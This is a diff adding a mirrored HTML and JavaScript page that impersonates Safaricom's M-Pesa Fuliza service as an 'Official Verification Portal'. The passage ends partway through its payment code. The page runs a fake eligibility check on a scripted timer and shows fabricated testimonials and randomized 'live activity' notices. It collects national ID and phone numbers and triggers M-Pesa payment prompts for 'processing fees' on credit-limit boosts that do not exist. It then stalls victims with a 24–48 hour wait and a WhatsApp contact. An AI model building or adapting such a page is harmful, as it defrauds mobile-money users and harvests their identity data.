@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from m-pesa-fuliza.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 May 2026 19:48:13 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Safaricom Fuliza Plus+ | Official Verification Portal</title>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <link href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&amp;display=swap');
+        :root {
+            --safaricom-green: #49aa33;
+            --saf-mint: #eafcf1;
+            --saf-primary: #1e293b;
+        }
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #f8fafc;
+            color: #1e293b;
+        }
+
+        .text-safaricom { color: var(--safaricom-green); }
+        .bg-safaricom { background-color: var(--safaricom-green); }
+        .border-safaricom { border-color: var(--safaricom-green); }
+
+        /* Support Bar */
+        .support-bar {
+            background: #0f172a;
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 800;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--safaricom-green);
+        }
+
+        /* Limit Cards */
+        .limit-card {
+            position: relative;
+            padding: 24px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+            border: 2px solid #e2e8f0;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            cursor: pointer;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .limit-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.1);
+            border-color: var(--safaricom-green);
+        }
+        .active-card {
+            border-color: var(--safaricom-green) !important;
+            background-color: #f0fdf4 !important;
+            box-shadow: 0 10px 25px rgba(73, 170, 51, 0.1);
+        }
+
+        .limit-amt {
+            font-size: 20px;
+            font-weight: 800;
+            color: #0f172a;
+            margin-top: 6px;
+        }
+        .limit-fee {
+            font-size: 12px;
+            font-weight: 700;
+            color: #49aa33;
+            margin-top: 2px;
+        }
+
+        /* Tags */
+        .tag-instant {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background-color: #ff5722;
+            color: white;
+            font-size: 9px;
+            font-weight: 800;
+            text-transform: uppercase;
+            padding: 4px 10px;
+            border-radius: 0px 0px 10px 0px;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        .tag-hot {
+            background-color: #ff1744;
+            color: white;
+            font-size: 8px;
+            font-weight: 850;
+            text-transform: uppercase;
+            padding: 3px 8px;
+            border-radius: 8px;
+            position: absolute;
+            top: 12px;
+            right: 12px;
+        }
+        .arrow-icon {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            color: #cbd5e0;
+            font-size: 12px;
+            opacity: 0.6;
+        }
+
+        /* Hero Offer */
+        .hero-offer {
+            grid-column: 1 / -1;
+            background: linear-gradient(135deg, #e4a20b 0%, #ffeb3b 50%, #f4c32b 100%);
+            border-radius: 24px;
+            padding: 32px 24px;
+            text-align: center;
+            color: #0f172a;
+            margin: 15px 0 24px 0;
+            box-shadow: 0 15px 35px rgba(228, 162, 11, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            position: relative;
+        }
+        .hero-offer::before,
+        .hero-offer::after {
+            content: "\f005";
+            font-family: "Font Awesome 6 Free";
+            font-weight: 900;
+            position: absolute;
+            font-size: 10px;
+            color: rgba(0,0,0,0.5);
+        }
+        .hero-offer::before { top: 12px; left: 12px; }
+        .hero-offer::after { bottom: 12px; right: 12px; }
+
+        .offer-label {
+            display: inline-block;
+            font-size: 10px;
+            font-weight: 800;
+            text-transform: uppercase;
+            background: rgba(0,0,0,0.08);
+            padding: 5px 15px;
+            border-radius: 20px;
+            letter-spacing: 0.05em;
+        }
+        .offer-amt {
+            font-size: 38px;
+            font-weight: 900;
+            margin: 8px 0;
+            letter-spacing: -0.02em;
+        }
+
+        .hero-fee-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: white;
+            color: var(--safaricom-green);
+            font-size: 11px;
+            font-weight: 800;
+            padding: 8px 18px;
+            border-radius: 20px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+
+        .btn-hero {
+            background-color: #0f172a;
+            color: white;
+            font-weight: 800;
+            font-size: 11px;
+            text-transform: uppercase;
+            padding: 12px 24px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            transition: all 0.2s;
+            letter-spacing: 0.05em;
+            cursor: pointer;
+        }
+        .btn-hero:hover {
+            transform: translateY(-1px);
+            background-color: #1e293b;
+        }
+
+        .hidden-site { display: none !important; }
+
+        /* Toast */
+        #live-toast {
+            position: fixed;
+            bottom: 100px;
+            left: 20px;
+            right: 20px;
+            background: white;
+            padding: 12px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            border-left: 4px solid var(--safaricom-green);
+            transform: translateX(-150%);
+            transition: transform 0.5s ease-out;
+            z-index: 1000;
+            max-width: 320px;
+        }
+        #live-toast.show { transform: translateX(0); }
+
+        /* Scanner Line */
+        .scanner-line {
+            width: 100%;
+            height: 2px;
+            background: var(--safaricom-green);
+            position: absolute;
+            top: 0;
+            left: 0;
+            box-shadow: 0 0 15px var(--safaricom-green);
+            animation: scan 2s linear infinite;
+        }
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        /* Animations */
+        @keyframes dot-pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.5); opacity: 0.5; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .online-indicator { animation: dot-pulse 2s infinite; }
+
+        /* Button Fixes */
+        button {
+            cursor: pointer;
+        }
+        #eligibilityBtn {
+            transition: all 0.3s ease;
+        }
+        #eligibilityBtn:hover {
+            background-color: #3a8a2b;
+        }
+        #eligibilityBtn:active {
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body class="bg-slate-50">
+
+    <!-- Live Toast -->
+    <div id="live-toast" class="flex items-center gap-3">
+        <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center text-safaricom">
+            <i class="fas fa-bolt"></i>
+        </div>
+        <div>
+            <p class="text-[10px] font-bold text-slate-400 uppercase">Live Activity</p>
+            <p id="toast-msg" class="text-xs font-bold text-slate-800"></p>
+        </div>
+    </div>
+
+    <!-- Support Bar -->
+    <div class="support-bar sticky top-0 z-[60]">
+        <div class="flex items-center gap-2">
+            <i class="fas fa-headset text-safaricom"></i>
+            <span class="uppercase tracking-wider">24/7 LIVE SUPPORT</span>
+        </div>
+        <div class="flex items-center gap-4">
+            <a href="tel:0722000000" class="hidden md:block">0722 000 000</a>
+            <div onclick="toggleZuriChat()" class="flex items-center gap-1.5 cursor-pointer hover:text-safaricom transition-colors">
+                <i class="fas fa-comment-alt text-safaricom"></i>
+                <span class="uppercase">LIVE CHAT WITH ZURI</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- System Status Bar -->
+    <div class="bg-slate-900 text-white py-2.5 text-[9px] font-black text-center uppercase tracking-[0.2em] px-4 border-b border-white/10">
+        <span class="text-green-400 animate-pulse">●</span> System Status: Online | Encryption: AES-256 | Node: SAF-024
+    </div>
+
+    <!-- Zuri Chat Widget -->
+    <div id="zuri-container" class="fixed bottom-6 right-6 z-[500] cursor-pointer flex flex-col items-end">
+        <div id="zuri-bubble" class="hidden bg-white text-slate-800 text-[11px] font-bold py-2.5 px-4 rounded-2xl shadow-2xl border-2 border-[#49aa33] mb-3 animate-bounce relative max-w-[180px] text-center">
+            Need help choosing the right fuliza limit for your line?
+            <div class="absolute -bottom-2 right-6 w-3 h-3 bg-white border-r-2 border-b-2 border-[#49aa33] rotate-45"></div>
+        </div>
+        <div onclick="toggleZuriChat()" class="group flex items-center gap-3 bg-white p-2 pr-6 rounded-full shadow-[0_15px_35px_rgba(0,0,0,0.15)] border-2 border-slate-100 hover:border-safaricom transition-all active:scale-95">
+            <div class="w-12 h-12 bg-safaricom rounded-full flex items-center justify-center text-white relative shadow-lg">
+                <i class="fas fa-headset text-xl"></i>
+                <div class="absolute -bottom-0.5 -right-0.5 w-4 h-4 bg-green-500 border-2 border-white rounded-full online-indicator"></div>
+            </div>
+            <div class="flex flex-col">
+                <span class="text-[9px] font-black text-slate-400 uppercase tracking-widest leading-none">Support</span>
+                <span class="text-[13px] font-extrabold text-slate-800">Chat with Zuri</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Landing Page -->
+    <div id="landing-page" class="max-w-2xl mx-auto px-4 py-8">
+        <div id="check-step" class="bg-white p-8 rounded-[2rem] shadow-xl border border-slate-100 text-center mb-10">
+            <div class="flex justify-center mb-4">
+                <div class="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center">
+                    <i class="fas fa-user-shield text-safaricom text-3xl"></i>
+                </div>
+            </div>
+            <h1 class="text-3xl font-extrabold text-slate-900 mb-1">Safaricom M-Pesa Fuliza Boost</h1>
+            <p class="text-[11px] font-bold text-safaricom uppercase tracking-widest mb-6">Instant Limit Increase • Same Day Access</p>
+
+            <div class="relative mb-4">
+                <i class="fas fa-phone-alt absolute left-4 top-5 text-slate-400"></i>
+                <input type="number" id="checkPhone" placeholder="Enter M-Pesa Number" class="w-full pl-12 pr-4 py-5 bg-slate-50 border-2 border-slate-100 rounded-2xl focus:border-safaricom outline-none text-lg font-bold">
+            </div>
+
+            <button id="eligibilityBtn" onclick="startVerification()" class="w-full bg-safaricom text-white font-bold py-5 rounded-2xl shadow-lg active:scale-95 transition-all cursor-pointer hover:bg-green-700">
+                Check My Fuliza Increase Eligibility <i class="fas fa-chevron-right text-xs ml-2"></i>
+            </button>
+        </div>
+
+        <!-- Verifying Step -->
+        <div id="verifying-step" class="hidden bg-white p-12 rounded-[2rem] shadow-xl text-center mb-10 relative overflow-hidden">
+            <div class="scanner-line"></div>
+            <div class="w-16 h-16 border-4 border-safaricom border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+            <h3 class="text-xl font-bold text-slate-800 mb-2" id="status-text">Connecting...</h3>
+            <p class="text-sm text-slate-500" id="sub-status-text">Accessing safaricom secure databases...</p>
+        </div>
+
+        <!-- Result Step -->
+        <div id="result-step" class="hidden bg-white p-10 rounded-[2rem] shadow-xl text-center mb-10 border-2 border-safaricom">
+            <i class="fas fa-check-circle text-safaricom text-6xl mb-4"></i>
+            <h2 class="text-2xl font-extrabold mb-2">Congratulations! You are Pre-approved for a new limit</h2>
+            <p class="text-slate-600 mb-6">Your number <span id="displayNum" class="font-bold text-safaricom"></span> is eligible for a limit boost. <span class="font-bold">Keep using M-Pesa to grow your limit even higher</span>.</p>
+            <button onclick="revealMainSite()" class="w-full bg-slate-900 text-white font-bold py-5 rounded-2xl shadow-xl cursor-pointer hover:bg-slate-800 transition-all">Proceed to Select and Upgrade</button>
+        </div>
+
+        <!-- User Feedback -->
+        <div class="mb-12">
+            <h3 class="text-center font-bold text-slate-800 mb-6 flex items-center justify-center gap-2">
+                <i class="fas fa-comment-dots text-safaricom"></i> Real-Time User Feedback
+            </h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-white p-4 rounded-xl border border-slate-100 shadow-sm flex gap-3">
+                    <img src="https://ui-avatars.com/api/?name=David+L&amp;background=49aa33&amp;color=fff" class="w-10 h-10 rounded-full">
+                    <div>
+                        <p class="text-xs font-bold">David L. <span class="text-safaricom ml-1 text-[10px]"><i class="fas fa-check-circle"></i> Verified</span></p>
+                        <p class="text-[12px] text-slate-600">"My limit moved from 2k to 75k in under 10 mins. Highly recommended for safaricom users to start businesses!"</p>
+                    </div>
+                </div>
+                <div class="bg-white p-4 rounded-xl border border-slate-100 shadow-sm flex gap-3">
+                    <img src="https://ui-avatars.com/api/?name=Mercy+A&amp;background=49aa33&amp;color=fff" class="w-10 h-10 rounded-full">
+                    <div>
+                        <p class="text-xs font-bold">Mercy A. <span class="text-safaricom ml-1 text-[10px]"><i class="fas fa-check-circle"></i> Verified</span></p>
+                        <p class="text-[12px] text-slate-600">"The process was very professional. My business limit is now boosted. Thank You so much"</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- FAQ -->
+        <div class="mb-12">
+            <h3 class="font-bold text-slate-800 mb-6 px-2 border-l-4 border-safaricom">Frequently Asked Questions</h3>
+            <div class="space-y-3 text-sm">
+                <div class="bg-white p-4 rounded-xl border border-slate-200">
+                    <p class="font-bold mb-1">1. How long does the boost take and to reflect on my M-pesa?</p>
+                    <p class="text-slate-500">Typically applied within 10 to 20 minutes after verification and processing.</p>
+                </div>
+                <div class="bg-white p-4 rounded-xl border border-slate-200">
+                    <p class="font-bold mb-1">2. Is my Safaricom PIN required?</p>
+                    <p class="text-slate-500">No. We never ask for your PIN. You only enter it on the official M-Pesa prompt to process your applied limit.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="py-10 border-t border-slate-200 text-center">
+            <div class="flex justify-center gap-6 mb-4">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/1/15/M-PESA_LOGO-01.svg" class="h-5 opacity-60">
+                <span class="text-[10px] font-bold text-slate-400 uppercase tracking-widest self-center">Safaricom API Integrated</span>
+            </div>
+            <p class="text-xs font-bold text-slate-500">FulizaBoost Services Ltd • Nairobi, Kenya</p>
+        </footer>
+    </div>
+
+    <!-- Main Content (Limit Selection) -->
+    <div id="main-content" class="hidden-site max-w-2xl mx-auto px-4 py-8">
+        <h2 class="text-2xl font-extrabold mb-5 text-left border-l-4 border-safaricom pl-3">Select Your New Approved Limit</h2>
+        <div id="grid-container" class="grid grid-cols-2 gap-4 mb-8"></div>
+        <button id="main-upgrade-btn" onclick="checkSelection()" class="w-full bg-safaricom text-white font-bold py-5 rounded-2xl shadow-xl transition-all hidden uppercase tracking-wider text-sm cursor-pointer hover:bg-green-700">
+            SELECT A LIMIT
+        </button>
+    </div>
+
+    <!-- Payment Modal (HashBack STK Integrated) -->
+    <div id="paymentModal" class="fixed inset-0 bg-black/60 hidden items-center justify-center p-4 z-[300] backdrop-blur-sm">
+        <div class="bg-white rounded-[2rem] overflow-hidden w-full max-w-sm shadow-2xl">
+            <div class="bg-safaricom p-6 text-white text-center">
+                <p class="text-[10px] font-bold uppercase tracking-widest opacity-80 mb-1">Secure Fuliza Application</p>
+                <h3 class="text-xl font-extrabold">Your Fuliza Limit Will be Boosted To <span id="sumLimit">Ksh 0</span></h3>
+            </div>
+            <div class="p-6">
+                <!-- Input Step -->
+                <div id="input-step">
+                    <div class="bg-green-50 p-4 rounded-xl mb-6">
+                        <p class="text-[11px] text-green-800 leading-relaxed font-semibold">
+                            Enter your ID Number and Safaricom number to receive the M-Pesa STK prompt.
+                        </p>
+                    </div>
+                    <input type="number" id="idNum" placeholder="ID Number" class="w-full mb-3 px-4 py-4 bg-slate-50 border rounded-xl font-bold outline-none focus:border-safaricom">
+                    <input type="number" id="phoneNum" placeholder="07XXXXXXXX" class="w-full mb-6 px-4 py-4 bg-slate-50 border rounded-xl font-bold outline-none focus:border-safaricom">
+                    <div class="flex gap-3">
+                        <button onclick="closeModal()" class="flex-1 py-4 bg-slate-100 text-slate-500 font-bold rounded-xl cursor-pointer hover:bg-slate-200">Cancel</button>
+                        <button onclick="initiatePayment()" class="flex-[2] py-4 bg-safaricom text-white font-bold rounded-xl cursor-pointer hover:bg-green-700">
+                            Pay <span id="sumFee">Ksh 0</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Response Step (Polling) -->
+                <div id="response-step" class="hidden py-8 text-center">
+                    <div id="paySpinner" class="w-12 h-12 border-4 border-green-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
+                    <div id="payIcon" class="hidden w-14 h-14 rounded-full mx-auto mb-4 items-center justify-center"></div>
+                    <h4 class="text-lg font-bold text-slate-800" id="payStatusTitle">Sending M-Pesa Prompt</h4>
+                    <p class="text-sm text-slate-500 mt-2 leading-relaxed" id="payStatusText">Please wait while we send the STK request to your phone.</p>
+
+                    <div class="bg-slate-50 border border-slate-100 rounded-2xl p-4 mt-5 text-left">
+                        <div class="flex justify-between py-2 border-b border-slate-100">
+                            <span class="text-xs font-bold text-slate-400 uppercase">Amount</span>
+                            <span class="text-sm font-extrabold text-green-700" id="payDisplayAmount">Ksh 0</span>
+                        </div>
+                        <div class="flex justify-between py-2 border-b border-slate-100">
+                            <span class="text-xs font-bold text-slate-400 uppercase">Phone</span>
+                            <span class="text-sm font-bold text-slate-700" id="payDisplayPhone">—</span>
+                        </div>
+                        <div class="flex justify-between py-2">
+                            <span class="text-xs font-bold text-slate-400 uppercase">Status</span>
+                            <span class="text-sm font-bold text-slate-700" id="payDisplayStatus">Preparing</span>
+                        </div>
+                    </div>
+
+                    <button id="checkPaymentBtn" onclick="checkPaymentNow()" class="bg-safaricom hover:bg-green-700 text-white px-8 py-4 rounded-xl font-bold w-full mt-5 active:scale-95 cursor-pointer">I Have Paid — Check Status</button>
+                    <button onclick="closeModal()" class="w-full mt-3 py-3 text-slate-500 font-bold text-sm cursor-pointer hover:text-slate-700">Cancel</button>
+                </div>
+
+                <!-- Success Step -->
+                <div id="success-step" class="hidden py-6 text-center">
+                    <div class="w-16 h-16 bg-safaricom rounded-full flex items-center justify-center text-white mx-auto mb-4 text-2xl">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <h3 class="text-xl font-extrabold text-slate-800 mb-1">Request Received</h3>
+                    <p class="text-sm text-slate-500 mt-3 leading-relaxed px-2">
+                        Your boost request has been received successfully. Please wait <strong>24–48 hours</strong> for the limit increase to be processed.
+                    </p>
+                    <div class="bg-green-50 border border-green-100 rounded-2xl p-4 my-5 text-left">
+                        <div class="flex justify-between py-2 border-b border-green-100">
+                            <span class="text-xs font-bold text-slate-400 uppercase">Status</span>
+                            <span class="text-sm font-extrabold text-green-700">Processing</span>
+                        </div>
+                        <div class="flex justify-between py-2">
+                            <span class="text-xs font-bold text-slate-400 uppercase">Timeline</span>
+                            <span class="text-sm font-bold text-slate-700">24–48 hrs</span>
+                        </div>
+                    </div>
+                    <div class="space-y-3">
+                        <button onclick="toggleZuriChat()" class="w-full py-4 bg-slate-800 text-white font-bold rounded-xl flex items-center justify-center gap-2 uppercase text-xs tracking-widest cursor-pointer hover:bg-slate-700">
+                            <i class="fas fa-comment"></i> Chat with Agent Zuri
+                        </button>
+                        <a href="https://wa.me/254743225483?text=Hello%20Safaricom%20Support,%20I%20have%20completed%20my%20Fuliza%20Plus%20verification.%20Please%20assist%20with%20my%20limit%20boost." class="w-full py-4 bg-[#25D366] text-white font-bold rounded-xl flex items-center justify-center gap-2 uppercase text-xs tracking-widest no-underline cursor-pointer hover:bg-[#1da852]">
+                            <i class="fab fa-whatsapp text-lg"></i> Contact via WhatsApp
+                        </a>
+                        <button onclick="location.reload()" class="w-full py-4 bg-slate-200 text-slate-600 font-bold rounded-xl flex items-center justify-center gap-2 uppercase text-[10px] mt-4 cursor-pointer hover:bg-slate-300">
+                            Back to Home
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script type="text/javascript">
+        var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+        let hasUserReachedFinalStep = false;
+
+        Tawk_API.onLoad = function(){
+            Tawk_API.hideWidget();
+        };
+
+        (function(){
+            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+            s1.async=true;
+            s1.src='https://embed.tawk.to/69ff04487b29e11c3321d049/default';
+            s1.charset='UTF-8';
+            s1.setAttribute('crossorigin','*');
+            s0.parentNode.insertBefore(s1,s0);
+        })();
+
+        // Zuri Chat Logic
+        function toggleZuriChat() {
+            if (!hasUserReachedFinalStep) {
+                const bubble = document.getElementById('zuri-bubble');
+                let currentMsg = "";
+
+                if (!document.getElementById('landing-page').classList.contains('hidden-site')) {
+                    currentMsg = "I'm standing by to help! Please check your eligibility and select a limit first so I can assist you better.";
+                }
+                else if (!document.getElementById('main-content').classList.contains('hidden-site')) {
+                    currentMsg = "Great news! You've been pre-approved. Select the limit that fits your needs and click 'Upgrade' so I can finalize your file.";
+                }
+                else if (document.getElementById('paymentModal').classList.contains('flex')) {
+                    currentMsg = "I see you're almost done! Once you confirm the M-Pesa prompt on your phone, I'll be able to activate your new limit immediately.";
+                } else {
+                    currentMsg = "Need help choosing the right limit for your line?";
+                }
+
+                bubble.innerText = currentMsg;
+                bubble.classList.remove('hidden');
+                setTimeout(() => bubble.classList.add('hidden'), 5000);
+            } else {
+                Tawk_API.toggle();
+            }
+        }
+
+        let zuriTimer;
+        function startZuriNudge() {
+            clearTimeout(zuriTimer);
+            zuriTimer = setTimeout(() => {
+                const bubble = document.getElementById('zuri-bubble');
+                if (bubble && !hasUserReachedFinalStep) bubble.classList.remove('hidden');
+            }, 30000);
+        }
+    </script>
+
+    <script>
+        // Limits Data
+        const limitsData = [
+            {amt: 5000, fee: 150, tags: [], type: 'standard'},
+            {amt: 10000, fee: 350, tags: [], type: 'standard'},
+            {amt: 15000, fee: 530, tags: [], type: 'standard'},
+            {amt: 20000, fee: 700, tags: [], type: 'standard'},
+            {amt: 25000, fee: 1050, tags: [], type: 'standard'},
+            {amt: 30000, fee: 1500, tags: [], type: 'standard'},
+            {amt: 35000, fee: 2000, tags: ['instant', 'hot'], type: 'standard'},
+            {amt: 45000, fee: 2499, tags: ['instant', 'hot'], type: 'standard'},
+            {amt: 55000, fee: 625, type: 'hero'},
+            {amt: 50000, fee: 3000, tags: ['instant'], type: 'standard'},
+            {amt: 60000, fee: 3500, tags: ['instant'], type: 'standard'},
+            {amt: 65000, fee: 4500, tags: ['instant'], type: 'standard'},
+            {amt: 70000, fee: 5000, tags: ['instant'], type: 'standard'},
+            {amt: 72000, fee: 6500, tags: [], type: 'standard'},
+            {amt: 75000, fee: 6999, tags: [], type: 'standard'}
+        ];
+
+        const names = ["Brian O.", "Mercy W.", "Kevin K.", "Faith J.", "David M.", "Peter N.", "Sarah L."];
+        const amountsList = [21000, 15500, 50000, 120000, 80000, 150000];
+
+        // Live Toast
+        function showLiveToast() {
+            const name = names[Math.floor(Math.random() * names.length)];
+            const amt = amountsList[Math.floor(Math.random() * amountsList.length)];
+            const safPrefixes = ["070", "071", "072", "074", "079", "011"];
+            const prefix = safPrefixes[Math.floor(Math.random() * safPrefixes.length)];
+            const phone = prefix + Math.floor(Math.random() * 9) + "***" + Math.floor(100 + Math.random() * 900);
+
+            const toastMsg = document.getElementById('toast-msg');
+            if(toastMsg) {
+                toastMsg.innerHTML = `${name} (${phone}) boosted to <span class="text-safaricom">Ksh ${amt.toLocaleString()}</span> just now`;
+                const toast = document.getElementById('live-toast');
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), 4000);
+            }
+        }
+        setInterval(showLiveToast, 15000);
+
+        // Verification Flow
+        function startVerification() {
+            const ph = document.getElementById('checkPhone').value;
+            if(!ph || ph.length < 10) return alert("Enter valid number");
+            document.getElementById('eligibilityBtn').innerText = "Processing...";
+            setTimeout(() => {
+                document.getElementById('check-step').classList.add('hidden');
+                document.getElementById('verifying-step').classList.remove('hidden');
+
+                let steps = ["Connecting to Node...", "Checking M-Pesa History...", "Verifying ID...", "Generating Offer..."];
+                let i = 0;
+                let logInt = setInterval(() => {
+                    if(i < steps.length) {
+                        document.getElementById('status-text').innerText = steps[i];
+                        i++;
+                    } else {
+                        clearInterval(logInt);
+                        document.getElementById('verifying-step').classList.add('hidden');
+                        document.getElementById('result-step').classList.remove('hidden');
+                        document.getElementById('displayNum').innerText = ph;
+                        document.getElementById('phoneNum').value = ph;
+                    }
+                }, 1500);
+            }, 800);
+        }
+
+        function revealMainSite() {
+            document.getElementById('landing-page').classList.add('hidden-site');
+            document.getElementById('main-content').classList.remove('hidden-site');
+            window.scrollTo({top: 0, behavior: 'smooth'});
+            startZuriNudge();
+        }
+
+        // Limits Grid
+        let selectedLimit = null, selectedFee = null;
+        const grid = document.getElementById('grid-container');
+        const upgradeBtn = document.getElementById('main-upgrade-btn');
+
+        limitsData.forEach(l => {
+            const div = document.createElement('div');
+            if (l.type === 'hero') {
+                div.className = "hero-offer";
+                div.innerHTML = `
+                    <span class="offer-label"><i class="fas fa-star mr-1"></i> SPECIAL EXCLUSIVE OFFER</span>
+                    <div class="offer-amt">Ksh ${l.amt.toLocaleString()}</div>
+                    <div class="flex items-center justify-center gap-3 mt-3 flex-wrap">
+                        <div class="hero-fee-pill">Processing Fee: <strong>Ksh ${l.fee}</strong></div>
+                        <button onclick="claimHeroOffer()" class="btn-hero cursor-pointer">Claim Offer! <i class="fas fa-chevron-right ml-1"></i></button>
+                    </div>
+                `;
+            } else {
+                div.className = "limit-card";
+                let tagsHTML = '';
+                if (l.tags.includes('instant')) tagsHTML += `<div class="tag-instant"><i class="fas fa-fire-alt text-xs"></i> Instant Access</div>`;
+                if (l.tags.includes('hot')) tagsHTML += `<div class="tag-hot">HOT</div>`;
+
+                div.innerHTML = `
+                    ${tagsHTML}
+                    <p class="limit-amt">Ksh ${l.amt.toLocaleString()}</p>
+                    <p class="limit-fee">Fee: Ksh ${l.fee}</p>
+                    <div class="arrow-icon"><i class="fas fa-chevron-right"></i></div>
+                `;
+
+                div.onclick = () => {
+                    document.querySelectorAll('.limit-card, .hero-offer').forEach(c => c.classList.remove('active-card'));
+                    div.classList.add('active-card');
+                    selectedLimit = l.amt;
+                    selectedFee = l.fee;
+                    upgradeBtn.innerText = `UPGRADE TO KSH ${l.amt.toLocaleString()}`;
+                    upgradeBtn.classList.remove('hidden');
+                    upgradeBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                };
+            }
+            grid.appendChild(div);
+        });
+
+        function claimHeroOffer() {
+            selectedLimit = 55000;
+            selectedFee = 625;
+            checkSelection();
+        }
+
+        function checkSelection() {
+            if(!selectedLimit) return alert("Please select a limit first");
+            document.getElementById('sumLimit').innerText = "Ksh " + selectedLimit.toLocaleString();
+            document.getElementById('sumFee').innerText = "Ksh " + selectedFee;
+            document.getElementById('paymentModal').classList.replace('hidden', 'flex');
+        }
+
+        function closeModal() {
+            clearInterval(paymentPoller);
+            paymentBusy = false;
+            paymentReference = null;
+            paymentReferences = [];
+            paymentPhone = null;
+            document.getElementById('paymentModal').classList.replace('flex', 'hidden');
+            document.getElementById('input-step').classList.remove('hidden');
+            document.getElementById('response-step').classList.add('hidden');
+            document.getElementById('success-step').classList.add('hidden');
+        }
+
+        // ========== HashBack STK Logic ==========
+        let paymentReference = null;
+        let paymentReferences = [];
+        let paymentPoller = null;
+        let paymentBusy = false;
+        let paymentPhone = null;
+
+        // Clean phone number (e.g., 0712345678 -> 254712345678)
+        function cleanPhone(phone) {
+            phone = String(phone || '').replace(/\s+/g, '').replace(/^\+/, '');
+            if (phone.startsWith('07') || phone.startsWith('01')) {
+                return '254' + phone.substring(1);
+            }
+            if (phone.startsWith('7') || phone.startsWith('1')) {
+                return '254' + phone;
+            }
+            if (phone.startsWith('254')) {
+                return phone;
+            }
+            throw new Error('Enter a valid M-Pesa number.');
+        }
+
+        // Generate a unique reference (e.g., FULIZA-1234567890-123456)
+        function createPaymentReference() {
+            return `FULIZA-${Date.now()}-${Math.floor(100000 + Math.random() * 900000)}`;
+        }
+
+        // Normalize payment status (e.g., "Success" -> "completed")
+        function normalizePaymentStatus(status) {
+            const s = String(status || '').toLowerCase().trim();
+            if (/paid|success|successful|complete|completed|confirmed/.test(s)) {
+                return 'completed';
+            }
+            if (/cancel|declin|reject|fail|timeout|insufficient|invalid|error/.test(s)) {
+                return 'failed';
+            }
+            return 'pending';
+        }
+
+        // Collect all possible reference candidates from API response
+        function collectReferenceCandidates(data, fallbackReference) {
+            const candidates = [
+                data?.payhero_reference,
+                data?.reference,
+                data?.external_reference,
+                data?.externalReference,
+                data?.MerchantRequestID,
+                data?.merchantRequestID,
+                data?.CheckoutRequestID,
+                data?.checkoutRequestID,
+                data?.checkout_id,
+                data?.data?.payhero_reference,
+                data?.data?.reference,
+                data?.data?.external_reference,
+                data?.data?.MerchantRequestID,
+                data?.data?.CheckoutRequestID,
+                fallbackReference
+            ]
+            .filter(Boolean)
+            .map(v => String(v).trim())
+            .filter(Boolean);
+
+            return [...new Set(candidates)];
+        }
+
+        // Recursively extract all string values from an object
+        function deepValues(obj) {
+            const values = [];
+            const walk = value => {
+                if (value === null || value === undefined) return;
+                if (typeof value === 'object') {
+                    if (Array.isArray(value)) value.forEach(walk);
+                    else Object.values(value).forEach(walk);
+                    return;
+                }
+                values.push(String(value));
+            };
+            walk(obj);
+            return values;
+        }
+
+        // Determine payment status from API response
+        function getVerificationStatus(data) {
+            const direct =
+                data?.status ||
+                data?.payment_status ||
+                data?.paymentStatus ||
+                data?.transaction_status ||
+                data?.transactionStatus ||
+                data?.state ||
+                data?.ResultDesc ||
+                data?.resultDesc ||
+                data?.message ||
+                data?.data?.status ||
+                data?.data?.payment_status ||
+                data?.data?.paymentStatus ||
+                data?.data?.transaction_status ||
+                data?.data?.transactionStatus ||
+                data?.data?.state ||
+                data?.data?.ResultDesc ||
+                data?.data?.resultDesc ||
+                data?.data?.message;
+
+            const directStatus = normalizePaymentStatus(direct);
+            if (directStatus !== 'pending') return directStatus;
+
+            const resultCode =
+                data?.ResultCode ??
+                data?.resultCode ??
